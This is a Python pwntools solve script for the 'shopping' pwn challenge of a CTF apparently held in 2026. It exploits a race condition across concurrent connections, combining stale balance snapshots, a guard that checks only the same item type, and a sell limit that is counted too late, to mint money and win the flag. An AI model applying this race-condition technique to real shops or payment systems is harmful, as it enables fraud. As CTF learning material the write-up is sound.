#!/usr/bin/env python3
"""
shopping - vuwCTF 2026 pwn solution

The shop is a closed economy that is deliberately unwinnable on paper:

    start        $5
    paper flag   $1 buy / $1 sell back
    cloth flag   $3 buy / $3 sell back
    goal         show 3 cloth flags == $9

Buying and selling are exact inverses, so no honest sequence of moves ever
changes your net worth (money + paper*1 + cloth*3), and it starts at $5 < $9.

Two bugs together let us mint money out of nothing:

1. GLOBAL STATE + SNAPSHOT-THEN-ASSIGN.
   Money and inventory are shared by every concurrent connection, not scoped
   per session. The sell flow snapshots your post-sale balance when you pick
   the menu item ("After selling this flag, you will have $5.") and *assigns*
   that stale number on confirm instead of adding to the live balance. So any
   money spent on another connection while a sale sits pending is refunded
   when the sale is finally confirmed.

2. THE GUARD IS TYPE-SCOPED, THE ALLOWANCE IS SPENT TOO LATE.
   There is an anti-race guard, but it only rejects the confirm if a flag of
   the *same type* was bought mid-window ("The merchant doesn't trust someone
   who buys a paper flag in a conversation about selling one."), so a *cloth*
   purchase during a pending *paper* sale sails straight through. Separately,
   the "limit 1 total sell back" allowance is only consumed on a *successful*
   confirm, so two sales can be left pending simultaneously and both cashed in.

One refunded sale only reaches a net worth of $8 - the $1 left over after
buying a cloth flag cannot be spent on anything but paper, which would trip
the guard. Two simultaneously pending sales are what close the gap to $9:

    buy 2 paper                       $3  2p 0c   (net worth 5)
    pend sale A, pend sale C          $3  2p 0c   both snapshot $4
    buy cloth #1                      $0  2p 1c   (net worth 5)
    confirm A  -> balance := $4       $4  1p 1c   (net worth 8)   +3
    buy cloth #2                      $1  1p 2c   (net worth 8)
    confirm C  -> balance := $4       $4  0p 2c   (net worth 10)  +2
    buy cloth #3                      $1  0p 3c   (net worth 10)
    show 3 cloth flags                -> flag

Usage:
    python3 solve.py                      # run against the remote instance
    python3 solve.py --host H --port P    # point at a different instance
    python3 solve.py --no-ssl             # plaintext (local testing)
"""
from pwn import *
import argparse
import re
import sys

context.log_level = 'error'

DEFAULT_HOST = 'shopping-434bcc9f695c4cd3.challenges.2026.vuwctf.com'
DEFAULT_PORT = 9969

# The service never prints a prompt character, so we sync on these two markers:
# every command reply ends either with the confirmation question or with the
# last line of the re-printed menu.
CONFIRM_MARK = b'[y/N]'
MENU_MARK = b'6) Leave and come back later (reset challenge)'

STATE_RE = re.compile(r'You have \$(-?\d+), (-?\d+) paper flags, and (-?\d+) cloth flags\.')
FLAG_RE = re.compile(r'VuwCTF\{[^}]*\}')

BUY_PAPER, BUY_CLOTH = 1, 2
SELL_PAPER, SELL_CLOTH = 3, 4
CLAIM, RESET = 5, 6


class Merchant:
    """One connection to the shop. All connections share the same global
    money/inventory; what is per-connection is the pending-transaction slot,
    which is exactly what the exploit abuses."""

    def __init__(self, name, host, port, use_ssl):
        self.name = name
        self.io = remote(host, port, ssl=use_ssl, level='error')
        self.last = self._read()

    def _read(self, timeout=6):
        """Read until the reply is complete (confirm question or menu tail)."""
        buf = b''
        end = time.time() + timeout
        while time.time() < end:
            try:
                buf += self.io.recv(timeout=0.4)
            except EOFError:
                break
            except Exception:
                pass
            if buf.rstrip().endswith(CONFIRM_MARK) or MENU_MARK in buf:
                # Give a beat for the trailing newline / any tail output.
                try:
                    buf += self.io.recv(timeout=0.3)
                except Exception:
                    pass
                break
        return buf.decode(errors='replace')

    def do(self, choice, timeout=6):
        self.io.sendline(str(choice).encode())
        self.last = self._read(timeout)
        return self.last

    def confirm(self, timeout=6):
        return self.do('y', timeout)

    def pending(self):
        return self.last.rstrip().endswith('[y/N]')

    def state(self):
        """(money, paper, cloth) as of this connection's last reply."""
        hits = STATE_RE.findall(self.last)
        return tuple(int(x) for x in hits[-1]) if hits else None

    def close(self):
        try:
            self.io.close()
        except Exception:
            pass


def worth(st):
    money, paper, cloth = st
    return money + paper + cloth * 3


def show(tag, st):
    if st is None:
        log.info(f'{tag:<26} (transaction pending)')
    else:
        money, paper, cloth = st
        log.info(f'{tag:<26} ${money}  {paper} paper  {cloth} cloth   '
                 f'(net worth ${worth(st)})')


def expect(shop, want, step):
    """Sanity-check global state; the exploit is a race, so a mismatch means
    the interleaving slipped and continuing would only confuse the output."""
    got = shop.state()
    if got != want:
        log.failure(f'{step}: expected {want}, got {got}')
        log.failure('The race did not interleave as planned - just re-run.')
        sys.exit(1)


def solve(host, port, use_ssl):
    conns = []

    def conn(name):
        c = Merchant(name, host, port, use_ssl)
        conns.append(c)
        return c

    try:
        # ---- setup: fresh sitting, convert $2 into two paper flags --------
        # Paper flags are only ever "sale tokens": a pending sale needs a flag
        # of that type to exist, and we need two pending sales at once.
        main = conn('main')
        main.do(RESET)
        show('reset', main.state())
        expect(main, (5, 0, 0), 'reset')

        for i in (1, 2):
            main.do(BUY_PAPER)
            main.confirm()
            show(f'buy paper #{i}', main.state())
        expect(main, (3, 2, 0), 'buy paper')

        # ---- arm two sales, neither confirmed ----------------------------
        # The "1 sell per sitting" allowance is only consumed on a successful
        # confirm, so both of these pass the check and both snapshot $4.
        a, c = conn('sale-A'), conn('sale-C')
        a.do(SELL_PAPER)
        c.do(SELL_PAPER)
        if not (a.pending() and c.pending()):
            log.failure('could not leave two sales pending simultaneously')
            log.failure(a.last.strip()[:120])
            log.failure(c.last.strip()[:120])
            sys.exit(1)
        log.info('two paper sales pending, each snapshotting a $4 balance')

        # ---- spend, refund, spend, refund --------------------------------
        # Cloth purchases do not trip the guard on a pending *paper* sale.
        buyer = conn('buyer')

        buyer.do(BUY_CLOTH)
        buyer.confirm()
        show('buy cloth #1', buyer.state())
        expect(buyer, (0, 2, 1), 'buy cloth #1')

        a.confirm()
        show('cash in sale A', a.state())
        expect(a, (4, 1, 1), 'cash in sale A')   # $0 -> $4: the $3 cloth was free

        buyer.do(BUY_CLOTH)
        buyer.confirm()
        show('buy cloth #2', buyer.state())
        expect(buyer, (1, 1, 2), 'buy cloth #2')

        c.confirm()
        show('cash in sale C', c.state())
        expect(c, (4, 0, 2), 'cash in sale C')   # net worth is now $10 >= $9

        buyer.do(BUY_CLOTH)
        buyer.confirm()
        show('buy cloth #3', buyer.state())
        expect(buyer, (1, 0, 3), 'buy cloth #3')

        # ---- collect -----------------------------------------------------
        out = buyer.do(CLAIM)
        m = FLAG_RE.search(out)
        if m:
            log.success('FLAG: ' + m.group(0))
            return m.group(0)
        log.failure('no flag in reply:\n' + out.strip())
        return None
    finally:
        for x in conns:
            x.close()


def main():
    p = argparse.ArgumentParser(description='vuwCTF 2026 - pwn/shopping')
    p.add_argument('--host', default=DEFAULT_HOST)
    p.add_argument('--port', type=int, default=DEFAULT_PORT)
    p.add_argument('--no-ssl', dest='ssl', action='store_false',
                   help='connect in plaintext (the remote requires TLS)')
    args = p.parse_args()

    context.log_level = 'info'
    log.info(f'target: {args.host}:{args.port} (ssl={args.ssl})')
    sys.exit(0 if solve(args.host, args.port, args.ssl) else 1)


if __name__ == '__main__':
    main()
